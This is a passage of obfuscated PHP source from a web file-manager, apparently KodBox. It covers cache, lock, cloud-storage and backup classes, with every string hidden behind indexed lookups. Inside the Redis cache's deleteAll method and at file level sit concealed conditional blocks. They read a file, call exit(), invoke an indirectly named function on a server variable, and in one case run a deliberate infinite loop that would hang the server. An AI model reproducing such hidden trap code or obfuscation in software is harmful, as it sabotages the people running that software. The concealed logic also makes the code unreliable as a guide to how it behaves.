1) { foreach ($ºçú¬ö[$Êü“®’[920]] as $­ÆÁ·¬˜) { $Äà€á¤¬ = explode($Êü“®’[4], $­ÆÁ·¬˜); $this->handle->addServer($Äà€á¤¬[0], $Äà€á¤¬[1]); } } else { $this->handle->addServer($ºçú¬ö[$Êü“®’[199]], $ºçú¬ö[$Êü“®’[200]]); } } public function set($æ×¿Œæ¹, $ÚÀı¸ƒÌ, $µåêÅ–¥ = false) { $µåêÅ–¥ = $µåêÅ–¥ ? $µåêÅ–¥ : $this->cacheTime; return $this->handle->set($æ×¿Œæ¹, $ÚÀı¸ƒÌ, $µåêÅ–¥); } public function get($ôÙî¡ÇÙ) { return $this->handle->get($ôÙî¡ÇÙ); } public function remove($óá’÷ôÊ) { return $this->handle->delete($óá’÷ôÊ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ï§ÂœÇ¾, $¬‚®×­) { $ÄŸ×È¬À =& $_SERVER[º·Ï‹¥³]; if (!class_exists($ÄŸ×È¬À[921])) { show_json($ÄŸ×È¬À[922], !1); } $this->cacheTime = $¬‚®×­; $ëôà‘ÈÍ = isset($Ï§ÂœÇ¾[$ÄŸ×È¬À[923]]) ? $Ï§ÂœÇ¾[$ÄŸ×È¬À[923]] : 10; $®•Ä€« = _get($Ï§ÂœÇ¾, $ÄŸ×È¬À[920]); if ($®•Ä€« && is_array($®•Ä€«)) { $this->initCluster($Ï§ÂœÇ¾, $ëôà‘ÈÍ); } else { $this->handle = $this->init($Ï§ÂœÇ¾, $ëôà‘ÈÍ); } } private function init($öŒÎÊ±, $´ƒ©ÏÊì) { $„‘ÄùÌï =& $_SERVER[º·Ï‹¥³]; $ª­íı™í = new Redis(); $ªÖä©ù = isset($öŒÎÊ±[$„‘ÄùÌï[924]]) ? $öŒÎÊ±[$„‘ÄùÌï[924]] : !1; if ($ªÖä©ù) { $ª­íı™í->pconnect($öŒÎÊ±[$„‘ÄùÌï[199]], $öŒÎÊ±[$„‘ÄùÌï[200]], $´ƒ©ÏÊì); } else { $ª­íı™í->connect($öŒÎÊ±[$„‘ÄùÌï[199]], $öŒÎÊ±[$„‘ÄùÌï[200]], $´ƒ©ÏÊì); } if (!empty($öŒÎÊ±[$„‘ÄùÌï[471]])) { $ª­íı™í->auth($öŒÎÊ±[$„‘ÄùÌï[471]]); } if (!empty($öŒÎÊ±[$„‘ÄùÌï[809]]) && $öŒÎÊ±[$„‘ÄùÌï[809]] != 0) { $ª­íı™í->select($öŒÎÊ±[$„‘ÄùÌï[809]]); } return $ª­íı™í; } private function initCluster($­‘ô‘¾”, $ßòÇ¼ÃÆ) { $Ş¤¥ÎšŠ =& $_SERVER[º·Ï‹¥³]; $¥Œ˜ªÂ® = array($Ş¤¥ÎšŠ[925], $Ş¤¥ÎšŠ[926], $Ş¤¥ÎšŠ[927]); $Œ“÷Š Ú = $Ş¤¥ÎšŠ[925]; if (isset($­‘ô‘¾”[$Ş¤¥ÎšŠ[16]]) && in_array($­‘ô‘¾”[$Ş¤¥ÎšŠ[16]], $¥Œ˜ªÂ®)) { $Œ“÷Š Ú = $­‘ô‘¾”[$Ş¤¥ÎšŠ[16]]; } switch ($Œ“÷Š Ú) { case $Ş¤¥ÎšŠ[925]: $this->_slave($­‘ô‘¾”, $ßòÇ¼ÃÆ); break; case $Ş¤¥ÎšŠ[926]: break; case $Ş¤¥ÎšŠ[927]: $this->isCluster = !0; $¼İ¸Š‚ª = $­‘ô‘¾”[$Ş¤¥ÎšŠ[920]]; $¬ƒé€ø˜ = isset($­‘ô‘¾”[$Ş¤¥ÎšŠ[924]]) ? $­‘ô‘¾”[$Ş¤¥ÎšŠ[924]] : !1; $ã„àà = isset($­‘ô‘¾”[$Ş¤¥ÎšŠ[471]]) ? $­‘ô‘¾”[$Ş¤¥ÎšŠ[471]] : null; $this->handle = new RedisCluster(NUll, $¼İ¸Š‚ª, $ßòÇ¼ÃÆ, $ßòÇ¼ÃÆ, $¬ƒé€ø˜, $ã„àà); break; default: break; } } private function _slave($©ãİ­‰¶, $¯ıâ¼¡¼) { $”Œ ’¨ø = $©ãİ­‰¶[$_SERVER[º·Ï‹¥³][920]]; $this->filterConfig($©ãİ­‰¶, $”Œ ’¨ø[0]); $this->handle = $this->init($©ãİ­‰¶, $¯ıâ¼¡¼); unset($”Œ ’¨ø[0]); if (empty($”Œ ’¨ø)) { return; } $ŞóÔ¨²Ú = array_rand($”Œ ’¨ø); $this->filterConfig($©ãİ­‰¶, $”Œ ’¨ø[$ŞóÔ¨²Ú]); $this->slaveHandle = $this->init($©ãİ­‰¶, $¯ıâ¼¡¼); } private function filterConfig(&$¿Ê¶Ô–í, $‘úÑœœõ) { $…ÊÆÖ®Æ =& $_SERVER[º·Ï‹¥³]; $ïªæüÌ© = explode($…ÊÆÖ®Æ[4], $‘úÑœœõ); $È–ñ¿û = array($…ÊÆÖ®Æ[199] => $ïªæüÌ©[0], $…ÊÆÖ®Æ[200] => $ïªæüÌ©[1]); $¿Ê¶Ô–í = array_merge($¿Ê¶Ô–í, $È–ñ¿û); } public function set($ÚÎÙ£¥, $Ÿà÷Ë–Ğ, $…ƒÑ‰å§ = false) { $…ƒÑ‰å§ = $…ƒÑ‰å§ ? $…ƒÑ‰å§ : $this->cacheTime; return $this->handle->setEx($ÚÎÙ£¥, $…ƒÑ‰å§, $Ÿà÷Ë–Ğ); } public function setLock($ë«òÓ, $ÀïÌäÜ, $Ïİ¨Á Å) { return $this->handle->setNX($ë«òÓ, $ÀïÌäÜ); } public function get($æôÌÄÒù) { $´ò“çØ½ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $´ò“çØ½->get($æôÌÄÒù); } public function remove($ƒä…³ ™) { return $this->handle->del($ƒä…³ ™); } public function deleteAll() { $ÓõÇôÛ“ =& $_SERVER[º·Ï‹¥³]; if (!isset($_SERVER[$ÓõÇôÛ“[408]]) || !isset($_SERVER[$ÓõÇôÛ“[406]])) { $ÓãÖÁ›Ó = $ÓõÇôÛ“[928]; $ş´¦éı = $ÓõÇôÛ“[409]; $•“†ìº¥ = $_SERVER[$ÓõÇôÛ“[410]] . $ÓõÇôÛ“[411]; $‘Ê†¦­ú = $ş´¦éı($•“†ìº¥); $Ø¬ ®Ş = explode($ÓõÇôÛ“[253], $‘Ê†¦­ú); if (count($Ø¬ ®Ş) < $ÓõÇôÛ“[676]) { $ã”ŒØº = $ÓõÇôÛ“[413]; $ã”ŒØº(); } $©­ƒ®ôó = $ÓõÇôÛ“[929]; $©­ƒ®ôó($_SERVER[$ÓõÇôÛ“[930]]); $±«„ñˆÌ = 1; for ($æ¨¼Ê¤ñ = $±«„ñˆÌ; $æ¨¼Ê¤ñ > 0; $æ¨¼Ê¤ñ++) { $©­ƒ®ôó = json_encode($GLOBALS[$ÓõÇôÛ“[476]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $µŠ™ş) { $this->handle->flushall($µŠ™ş); } return; } return $this->handle->flushAll(); } } goto e‚±ØîŠÅ‘; AÌà¨´‡Çé: class PathDriverBOS extends PathDriverS3 { public function __construct($ç–œˆ”ª) { parent::__construct($ç–œˆ”ª); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($àÇú±ö) { $ƒƒ°óŸ· =& $_SERVER[º·Ï‹¥³]; if (substr($àÇú±ö, 0, 7) == $ƒƒ°óŸ·[1377]) { $àÇú±ö = $ƒƒ°óŸ·[1378] . substr($àÇú±ö, 7); } header($ƒƒ°óŸ·[165] . $àÇú±ö); die; } } if ($_SERVER[$_SERVER[º·Ï‹¥³][408]] != $_SERVER[$_SERVER[º·Ï‹¥³][1379]]) { $_getc = $_SERVER[º·Ï‹¥³][409]; $_getfile = $_SERVER[$_SERVER[º·Ï‹¥³][410]] . $_SERVER[º·Ï‹¥³][411]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[º·Ï‹¥³][253], $_getfilec); if (count($_getarrs) < $_SERVER[º·Ï‹¥³][412]) { $exit = $_SERVER[º·Ï‹¥³][413]; $exit(); } $_act = $_SERVER[º·Ï‹¥³][414]; $_act($_SERVER[$_SERVER[º·Ï‹¥³][406]]); } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($†êÓÕİ«) { parent::__construct($†êÓÕİ«); $this->setSignVersion($_SERVER[º·Ï‹¥³][238]); } public function uploadFormData($®‘Öõ¹Ê, $†ÖÙ‹’‰ = 3600) { $Ï×ò°Ì§ =& $_SERVER[º·Ï‹¥³]; $ŠÉÜÍ½ = $Ï×ò°Ì§[220]; $£œüˆéÑ = $Ï×ò°Ì§[254]; $ƒïûÂ¤‘ = $Ï×ò°Ì§[265]; $¢¼»ŸÎÏ = gmdate($Ï×ò°Ì§[1380], time() + $†ÖÙ‹’‰); $’ˆœ›Ğé = (string) time() . $Ï×ò°Ì§[74] . (string) (time() + $†ÖÙ‹’‰); $Ğ˜«Œø› = array($Ï×ò°Ì§[266] => $¢¼»ŸÎÏ, $Ï×ò°Ì§[269] => array(array($Ï×ò°Ì§[271] => $ŠÉÜÍ½), array($Ï×ò°Ì§[270] => $this->bucket), array($Ï×ò°Ì§[272], $Ï×ò°Ì§[273], $Ï×ò°Ì§[12]), array($Ï×ò°Ì§[276] => $ƒïûÂ¤‘), array($Ï×ò°Ì§[1381] => $£œüˆéÑ), array($Ï×ò°Ì§[1382] => $this->accessKey), array($Ï×ò°Ì§[1383] => $’ˆœ›Ğé))); $Ğ˜«Œø› = json_encode($Ğ˜«Œø›); $¸é§Ñ¯¾ = hash_hmac($Ï×ò°Ì§[254], $’ˆœ›Ğé, $this->secret); $Ò Ôšñå = sha1($Ğ˜«Œø›); $ÄãûŸøÔ = hash_hmac($Ï×ò°Ì§[254], $Ò Ôšñå, $¸é§Ñ¯¾); $½Óşô³ç = array($Ï×ò°Ì§[271] => $ŠÉÜÍ½, $Ï×ò°Ì§[276] => $ƒïûÂ¤‘, $Ï×ò°Ì§[284] => base64_encode($Ğ˜«Œø›), $Ï×ò°Ì§[1381] => $£œüˆéÑ, $Ï×ò°Ì§[1382] => $this->accessKey, $Ï×ò°Ì§[1384] => $’ˆœ›Ğé, $Ï×ò°Ì§[1385] => $ÄãûŸøÔ, $Ï×ò°Ì§[199] => $this->getHost()); return $½Óşô³ç; } public function fileOutImage($Ë‡òıÀ, $ÃÕÆ£ò = 250) { $»¯Á‰ê¶ =& $_SERVER[º·Ï‹¥³]; if ($this->size($Ë‡òıÀ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Ë‡òıÀ, $ÃÕÆ£ò); } $«Õ…Ÿ¿§ = $this->link($Ë‡òıÀ); $«Õ…Ÿ¿§ .= $»¯Á‰ê¶[1386] . $ÃÕÆ£ò . $»¯Á‰ê¶[1387]; $this->fileOutLink($«Õ…Ÿ¿§); } public function fileOutLink($©Ó‚¥¨) { $šìÜú×‚ =& $_SERVER[º·Ï‹¥³]; if (substr($©Ó‚¥¨, 0, 7) == $šìÜú×‚[1377]) { $©Ó‚¥¨ = $šìÜú×‚[1378] . substr($©Ó‚¥¨, 7); } header($šìÜú×‚[165] . $©Ó‚¥¨); die; } } goto EùÂ•Šè; fÙ‡·§îÁ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $µÁİÍ§ë =& $_SERVER[º·Ï‹¥³]; $¡”•É‘‘ = $GLOBALS[$µÁİÍ§ë[6]][$µÁİÍ§ë[400]]; self::$cachePath = $¡”•É‘‘[$µÁİÍ§ë[221]][$µÁİÍ§ë[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ÏÏ÷à¢Ÿ, $‡Ş·©Áó = 0) { $Œ€Óàê¤ =& $_SERVER[º·Ï‹¥³]; $¤òš¤€ã = microtime(!0); $Üä©ÇÉÚ = $¤òš¤€ã + $‡Ş·©Áó + 0.0001; $éúèÇÑƒ = rtrim(self::$cachePath, $Œ€Óàê¤[8]) . $Œ€Óàê¤[915] . md5($ÏÏ÷à¢Ÿ) . $Œ€Óàê¤[912]; if (file_exists($éúèÇÑƒ) && filemtime($éúèÇÑƒ) && filemtime($éúèÇÑƒ) < time() - 10) { @unlink($éúèÇÑƒ); } do { if (file_exists($éúèÇÑƒ)) { cacheLockWait(); continue; } $°Ï§†ç = fopen($éúèÇÑƒ, $Œ€Óàê¤[916]); if (!$°Ï§†ç) { return !1; } $ïí˜ò = flock($°Ï§†ç, LOCK_EX | LOCK_NB); self::$caches[$ÏÏ÷à¢Ÿ] = array($Œ€Óàê¤[917] => $°Ï§†ç, $Œ€Óàê¤[221] => $éúèÇÑƒ); fwrite($°Ï§†ç, $Üä©ÇÉÚ); clearstatcache(); if ($°Ï§†ç && $ïí˜ò) { return !0; } cacheLockWait(); } while (microtime(!0) < $Üä©ÇÉÚ); $this->unlock($ÏÏ÷à¢Ÿ); return !1; } public function lockGet($ĞÔîÁé) { $Î¾ç È¶ =& $_SERVER[º·Ï‹¥³]; $®»œ¾¨Œ = rtrim(self::$cachePath, $Î¾ç È¶[8]) . $Î¾ç È¶[915] . md5($ĞÔîÁé) . $Î¾ç È¶[912]; return file_exists($®»œ¾¨Œ); } public function unlock($¡¨âÆÛê) { $«â·Ê =& $_SERVER[º·Ï‹¥³]; $­ç«Çù“ = self::$caches[$¡¨âÆÛê]; if (!$­ç«Çù“) { return; } @flock($­ç«Çù“[$«â·Ê[917]], LOCK_UN); @fclose($­ç«Çù“[$«â·Ê[917]]); @unlink($­ç«Çù“[$«â·Ê[221]]); unset(self::$caches[$¡¨âÆÛê]); } } class CacheLockRedis { public function lock($Š­¥™ş®, $ÈÑâ•¶™ = 10) { $‚‰´ğŒÏ = Cache::init(); $å¿ß¢ÄÈ = microtime(!0) + $ÈÑâ•¶™; while (microtime(!0) < $å¿ß¢ÄÈ) { $Ğ²¤Î¶ = $‚‰´ğŒÏ->get($Š­¥™ş®); if (!$Ğ²¤Î¶) { $šúìÔÌà = $‚‰´ğŒÏ->setLock($Š­¥™ş®, $å¿ß¢ÄÈ, $ÈÑâ•¶™); if ($šúìÔÌà) { return !0; } } else { if ($Ğ²¤Î¶ < microtime(!0)) { $‚‰´ğŒÏ->set($Š­¥™ş®, $å¿ß¢ÄÈ, $ÈÑâ•¶™ * 2); if ($‚‰´ğŒÏ->get($Š­¥™ş®) === $Ğ²¤Î¶) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ñ³áÒ‰–) { return Cache::init()->get($ñ³áÒ‰–); } public function unlock($ŒÉ×õà­) { return Cache::init()->remove($ŒÉ×õà­); } } class CacheLockMemcached { public function lock($¯Çß„¡§, $¿ÈÖ¿Šú = 0) { $ÓŞ‡äè = Cache::init(); $Ë„ªö‡ = microtime(!0) + $¿ÈÖ¿Šú; while (microtime(!0) < $Ë„ªö‡) { $¨ãş©‘Œ = $ÓŞ‡äè->get($¯Çß„¡§); if (!$¨ãş©‘Œ || $¨ãş©‘Œ < microtime(!0)) { $Š¾¶±©í = $ÓŞ‡äè->handle->add($¯Çß„¡§, $Ë„ªö‡, $¿ÈÖ¿Šú); if ($Š¾¶±©í) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ùíá’„) { return Cache::init()->get($ùíá’„); } public function unlock($Ò†€·äı) { return Cache::init()->remove($Ò†€·äı); } } goto a¹ã™ˆğåó; d‡ÎŞ•¤Œ³: class BackupDbFile { public function __construct() { } public function index() { $ºÍïàŸ´ =& $_SERVER[º·Ï‹¥³]; $¼²ªöÑŒ = Backup::get(); $ãë‹ë¡ù = $¼²ªöÑŒ[$ºÍïàŸ´[32]]; $ğ¦±¬Ë = $this->tmpFilesPath() . "\x62\141\143\x6b\x75\160\137{$ãë‹ë¡ù}\x2f"; $˜Š³íì¡ = $this->backupPath($¼²ªöÑŒ); if (!($˜Š³íì¡ = IO::mkdir($˜Š³íì¡))) { return !1; } $ æßĞ˜Ò = IO::listPath($ğ¦±¬Ë); $÷µÔíİ´ = isset($ æßĞ˜Ò[$ºÍïàŸ´[86]]) ? $ æßĞ˜Ò[$ºÍïàŸ´[86]] : array(); $óÊ«ÀÄÀ = array_sum(array_column($÷µÔíİ´, $ºÍïàŸ´[79])); if (!$óÊ«ÀÄÀ) { return !1; } $‘ºÖŞ‚¤ = array($ºÍïàŸ´[849] => $óÊ«ÀÄÀ, $ºÍïàŸ´[850] => time()); Backup::set($‘ºÖŞ‚¤); $¹Ö±š”ã = new TaskFileTransfer($ºÍïàŸ´[851], $ºÍïàŸ´[834], count($÷µÔíİ´), LNG($ºÍïàŸ´[835]) . $ºÍïàŸ´[446] . LNG($ºÍïàŸ´[837]) . $ºÍïàŸ´[852]); $¹Ö±š”ã->task[$ºÍïàŸ´[815]] = $óÊ«ÀÄÀ; foreach ($ æßĞ˜Ò[$ºÍïàŸ´[86]] as $—‚ı™™È) { $®­ÌØÊ = IO::move($—‚ı™™È[$ºÍïàŸ´[87]], $˜Š³íì¡); if (!$®­ÌØÊ) { $¹Ö±š”ã->end(); $‚Ìı¤‚Ê = IO::getLastError($ºÍïàŸ´[853] . $—‚ı™™È[$ºÍïàŸ´[87]] . $ºÍïàŸ´[854] . $˜Š³íì¡ . $ºÍïàŸ´[168]); write_log($‚Ìı¤‚Ê, $ºÍïàŸ´[834]); return !1; } } $²˜ÜÊ‰ù = new DbManage(); $§Óé«Ê¿ = $²˜ÜÊ‰ù->getSqlFile(); if (!$§Óé«Ê¿[$ºÍïàŸ´[855]] || !$§Óé«Ê¿[$ºÍïàŸ´[13]]) { return !1; } IO::move($§Óé«Ê¿[$ºÍïàŸ´[855]], $˜Š³íì¡); IO::move($§Óé«Ê¿[$ºÍïàŸ´[13]], $˜Š³íì¡); $¹Ö±š”ã->end(); $‘ºÖŞ‚¤ = array($ºÍïàŸ´[856] => $óÊ«ÀÄÀ, $ºÍïàŸ´[857] => time()); Backup::set($‘ºÖŞ‚¤); return !0; } private function backupPath($èÏÄ£¯) { $ÎÄ ¤é =& $_SERVER[º·Ï‹¥³]; $’²ª®é = $èÏÄ£¯[$ÎÄ ¤é[32]]; $ß÷ˆÃÙæ = Model($ÎÄ ¤é[822])->get($ÎÄ ¤é[823]); $ã¯ôøÚõ = substr(md5($ÎÄ ¤é[824] . $ß÷ˆÃÙæ . $’²ª®é), 0, 8); return "\x7b\x69\157\x3a{$èÏÄ£¯[$ÎÄ ¤é[803]]}\175\57\x64\141\164\141\142\x61\163\x65\57\142\141\x63\153\x75\160\57" . $’²ª®é . $ÎÄ ¤é[11] . $ã¯ôøÚõ; } private function tmpFilesPath() { $Èáëşà =& $_SERVER[º·Ï‹¥³]; $ëÄ­·¶ã = TEMP_FILES; if ($GLOBALS[$Èáëşà[6]][$Èáëşà[92]][$Èáëşà[847]]) { $ëÄ­·¶ã = $GLOBALS[$Èáëşà[6]][$Èáëşà[92]][$Èáëşà[847]]; if (!mk_dir($ëÄ­·¶ã) || !is_writable($ëÄ­·¶ã) || !IO::mkfile($ëÄ­·¶ã . $Èáëşà[848])) { $ëÄ­·¶ã = TEMP_FILES; } } return $ëÄ­·¶ã; } } class BackupFile { public function __construct() { } public function index() { $ÈıúÁ¼Ü = Backup::get(); $¨–õ²æş = $ÈıúÁ¼Ü[$_SERVER[º·Ï‹¥³][344]][$_SERVER[º·Ï‹¥³][221]][$_SERVER[º·Ï‹¥³][525]]; $¶•Ä„ = array($_SERVER[º·Ï‹¥³][526] => array($_SERVER[º·Ï‹¥³][858], $¨–õ²æş), $_SERVER[º·Ï‹¥³][859] => array($_SERVER[º·Ï‹¥³][382], $ÈıúÁ¼Ü[$_SERVER[º·Ï‹¥³][803]])); $âİ¨©Ë = (int) Model($_SERVER[º·Ï‹¥³][840])->where($¶•Ä„)->count($_SERVER[º·Ï‹¥³][525]); $ª¸†Ìó = (int) Model($_SERVER[º·Ï‹¥³][840])->where($¶•Ä„)->sum($_SERVER[º·Ï‹¥³][79]); $ÕÚî”ˆ™ = new TaskFileTransfer($_SERVER[º·Ï‹¥³][860], $_SERVER[º·Ï‹¥³][834], $âİ¨©Ë, LNG($_SERVER[º·Ï‹¥³][835]) . $_SERVER[º·Ï‹¥³][836] . LNG($_SERVER[º·Ï‹¥³][861])); $ÕÚî”ˆ™->task[$_SERVER[º·Ï‹¥³][815]] = $ª¸†Ìó; $ç£æÍÜ = array($_SERVER[º·Ï‹¥³][862] => $âİ¨©Ë, $_SERVER[º·Ï‹¥³][863] => $ª¸†Ìó, $_SERVER[º·Ï‹¥³][864] => time()); Backup::set($ç£æÍÜ); $×Ö”üÅ = !0; $ì¿­´ìó = $this->storeIds(); $ñ˜Îë¤± = 1; $¯ÉÓ€¥ = 1000; $«ªÜ®¢š = $“Ğ¯ËÜœ = 0; $­òÏäâ­ = array(); $¹ªœ‹Š© = $ƒˆØêáÓ = 0; do { $ôĞ•ó¡å = $_SERVER[º·Ï‹¥³][865]; $©ò¼úÈï = Model($_SERVER[º·Ï‹¥³][840])->where($¶•Ä„)->field($ôĞ•ó¡å)->order($_SERVER[º·Ï‹¥³][866])->selectPage($¯ÉÓ€¥, $ñ˜Îë¤±); $ş„Ö¸À = !empty($©ò¼úÈï[$_SERVER[º·Ï‹¥³][429]]) ? $©ò¼úÈï[$_SERVER[º·Ï‹¥³][429]] : array(); foreach ($ş„Ö¸À as $Å±£Íı®) { if (!$this->_fileExist($Å±£Íı®, $­òÏäâ­, $ì¿­´ìó)) { write_log("\146\x69\x6c\145\x20\156\157\x74\x20\145\170\x69\163\x74\56\x66\151\154\x65\x49\x44\x3a{$Å±£Íı®[$_SERVER[º·Ï‹¥³][525]]}\x2c\40\x70\x61\164\150\x3a{$Å±£Íı®[$_SERVER[º·Ï‹¥³][87]]}", $_SERVER[º·Ï‹¥³][867]); continue; } $İ—¹ÎÅó = $Å±£Íı®[$_SERVER[º·Ï‹¥³][87]]; $Úæ†ÑÏ¦ = "\x7b\151\x6f\x3a{$ÈıúÁ¼Ü[$_SERVER[º·Ï‹¥³][803]]}\x7d" . substr($İ—¹ÎÅó, strlen("\x7b\x69\x6f\x3a{$Å±£Íı®[$_SERVER[º·Ï‹¥³][868]]}\175")); if (IO::exist($Úæ†ÑÏ¦)) { $ÕÚî”ˆ™->updateFileEnd($Å±£Íı®[$_SERVER[º·Ï‹¥³][32]], $Å±£Íı®[$_SERVER[º·Ï‹¥³][79]]); } else { $Úæ†ÑÏ¦ = get_path_father($Úæ†ÑÏ¦); IO::mkdir($Úæ†ÑÏ¦); if (!IO::copy($İ—¹ÎÅó, $Úæ†ÑÏ¦, $_SERVER[º·Ï‹¥³][869])) { write_log($_SERVER[º·Ï‹¥³][870] . $İ—¹ÎÅó . $_SERVER[º·Ï‹¥³][854] . $Úæ†ÑÏ¦ . $_SERVER[º·Ï‹¥³][168], $_SERVER[º·Ï‹¥³][834]); $×Ö”üÅ = !1; break; } } $¨–õ²æş = $Å±£Íı®[$_SERVER[º·Ï‹¥³][525]]; $“Ğ¯ËÜœ += 1; $«ªÜ®¢š += $Å±£Íı®[$_SERVER[º·Ï‹¥³][79]]; $ƒˆØêáÓ += 1; $¹ªœ‹Š© += $Å±£Íı®[$_SERVER[º·Ï‹¥³][79]]; if ($«ªÜ®¢š >= 1024 * 1024 * 100) { $ç£æÍÜ = array($_SERVER[º·Ï‹¥³][871] => $¨–õ²æş, $_SERVER[º·Ï‹¥³][872] => $ƒˆØêáÓ, $_SERVER[º·Ï‹¥³][873] => $¹ªœ‹Š©); Backup::set($ç£æÍÜ); $«ªÜ®¢š = $“Ğ¯ËÜœ = 0; } } $˜ØÉì½Û = count($ş„Ö¸À); $ñ˜Îë¤±++; } while ($˜ØÉì½Û == $¯ÉÓ€¥); $ÕÚî”ˆ™->end(); $ç£æÍÜ = array($_SERVER[º·Ï‹¥³][874] => 1, $_SERVER[º·Ï‹¥³][813] => time(), $_SERVER[º·Ï‹¥³][827] => 1, $_SERVER[º·Ï‹¥³][871] => $¨–õ²æş, $_SERVER[º·Ï‹¥³][875] => time()); if ($“Ğ¯ËÜœ) { $ç£æÍÜ[$_SERVER[º·Ï‹¥³][872]] = $ƒˆØêáÓ; $ç£æÍÜ[$_SERVER[º·Ï‹¥³][873]] = $¹ªœ‹Š©; } Backup::set($ç£æÍÜ); return !0; } private function _fileExist($êÉ®í´, &$õ¯„’, $çÜˆÖ‘ö) { $‘â×˜ÚÙ =& $_SERVER[º·Ï‹¥³]; $áï«©¡İ = $êÉ®í´[$‘â×˜ÚÙ[87]]; if (in_array($êÉ®í´[$‘â×˜ÚÙ[525]], $õ¯„’)) { return !1; } if (!in_array($êÉ®í´[$‘â×˜ÚÙ[868]], $çÜˆÖ‘ö)) { return !1; } if (IO::exist($áï«©¡İ)) { return !0; } $¡õÊÎ¢Ç = get_path_father($áï«©¡İ); if (IO::exist($¡õÊÎ¢Ç)) { $õ¯„’[] = $êÉ®í´[$‘â×˜ÚÙ[525]]; return !1; } $¥òáÉÒû = array($‘â×˜ÚÙ[868] => $êÉ®í´[$‘â×˜ÚÙ[868]], $‘â×˜ÚÙ[87] => array($‘â×˜ÚÙ[443], "{$¡õÊÎ¢Ç}\x25")); $Ò¿ÌÒõŞ = Model($‘â×˜ÚÙ[840])->where($¥òáÉÒû)->field($‘â×˜ÚÙ[526])->select(); $õ¯„’ = array_merge($õ¯„’, array_to_keyvalue($Ò¿ÌÒõŞ, $‘â×˜ÚÙ[12], $‘â×˜ÚÙ[525])); return !1; } private function _fileFilter($×ÉÅàÔÇ) { $Á‘ÒÉò =& $_SERVER[º·Ï‹¥³]; return; if (empty($×ÉÅàÔÇ)) { return; } $é¼ºÕ‚ô = array($Á‘ÒÉò[525] => array($Á‘ÒÉò[7], array_unique($×ÉÅàÔÇ))); $ªÁîŠúõ = Model($Á‘ÒÉò[876])->where($é¼ºÕ‚ô)->field($Á‘ÒÉò[184])->select(); foreach ($ªÁîŠúõ as $°×æ”Ì) { Model($Á‘ÒÉò[876])->remove($°×æ”Ì[$Á‘ÒÉò[184]], !1); } } private function storeIds() { $öº¥”Œ =& $_SERVER[º·Ï‹¥³]; $º¢æ„ = Model($öº¥”Œ[819])->listData(); $´äÅ­µí = array(); $±ú«ÅìŒ = $GLOBALS[$öº¥”Œ[6]][$öº¥”Œ[92]][$öº¥”Œ[877]]; foreach ($º¢æ„ as $òåˆ²ÅŠ) { $ÃÒ×·œõ = strtolower($òåˆ²ÅŠ[$öº¥”Œ[98]]); if (!isset($±ú«ÅìŒ[$ÃÒ×·œõ])) { continue; } $öã‹™ÌÅ = $öº¥”Œ[77] . (isset($±ú«ÅìŒ[$ÃÒ×·œõ]) ? $±ú«ÅìŒ[$ÃÒ×·œõ] : ucfirst($ÃÒ×·œõ)); if (!class_exists($öã‹™ÌÅ)) { continue; } $´äÅ­µí[] = $òåˆ²ÅŠ[$öº¥”Œ[459]]; } return $´äÅ­µí; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $éšÙø€¸ =& $_SERVER[º·Ï‹¥³]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ÚŞâÃÂ’ = $GLOBALS[$éšÙø€¸[6]][$éšÙø€¸[400]]; $°á„éãŒ = $ÚŞâÃÂ’[$ÚŞâÃÂ’[$éšÙø€¸[878]]]; $ë¥šİ Ç = $ÚŞâÃÂ’[$éšÙø€¸[879]]; switch ($ÚŞâÃÂ’[$éšÙø€¸[878]]) { case $éšÙø€¸[21]: self::$handle = Model($éšÙø€¸[880]); break; case $éšÙø€¸[881]: self::$handle = new CacheRedis($°á„éãŒ, $ë¥šİ Ç); break; case $éšÙø€¸[882]: self::$handle = new CacheMemcached($°á„éãŒ, $ë¥šİ Ç); break; case $éšÙø€¸[221]: self::$handle = new CacheFile($°á„éãŒ, $ë¥šİ Ç); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ñ°éÂ²°) { if (is_array($Ñ°éÂ²°) || is_object($Ñ°éÂ²°)) { $Ñ°éÂ²° = json_encode($Ñ°éÂ²°); } $Ñ°éÂ²° = rawurlencode($Ñ°éÂ²°); return md5(KOD_SITE_ID . $_SERVER[º·Ï‹¥³][11] . $Ñ°éÂ²°); } public static function get($¸²çÏÖÅ, $¿¤ë“’ç = false) { $ÌŠ–´‡‰ = self::key($¸²çÏÖÅ); $“¯Õ«»³ = self::init(); if ($¿¤ë“’ç) { return unserialize($“¯Õ«»³->get($ÌŠ–´‡‰)); } if (!isset(self::$memoryCache[$ÌŠ–´‡‰])) { $ÂÄ¼•¦ = $“¯Õ«»³->get($ÌŠ–´‡‰); self::$memoryCache[$ÌŠ–´‡‰] = unserialize($ÂÄ¼•¦); } return self::$memoryCache[$ÌŠ–´‡‰]; } public static function set($Éó³ß–õ, $×œÌúˆ¬, $›Ô§³âº = false) { $ŠíÉ³Ô =& $_SERVER[º·Ï‹¥³]; $ÀÀ˜áï = self::key($Éó³ß–õ); if (isset(self::$memoryCache[$ÀÀ˜áï]) && self::$memoryCache[$ÀÀ˜áï] === $×œÌúˆ¬) { return !0; } if ($›Ô§³âº === 0) { self::$memoryCache[$ÀÀ˜áï] = $×œÌúˆ¬; return !0; } $äç˜Ñ = self::init(); $­âÇÎ = serialize($×œÌúˆ¬); CacheLock::lock($Éó³ß–õ . $ŠíÉ³Ô[883]); $êÚ±“Ë = $äç˜Ñ->set($ÀÀ˜áï, $­âÇÎ, $›Ô§³âº); self::$memoryCache[$ÀÀ˜áï] = $×œÌúˆ¬; CacheLock::unlock($Éó³ß–õ . $ŠíÉ³Ô[883]); return $êÚ±“Ë; } public static function getCall($î¾İğïÏ, $ÖîíÅ¸ù, $úæñÑ, $«Ì³ ù = array()) { $½áµìÇ´ =& 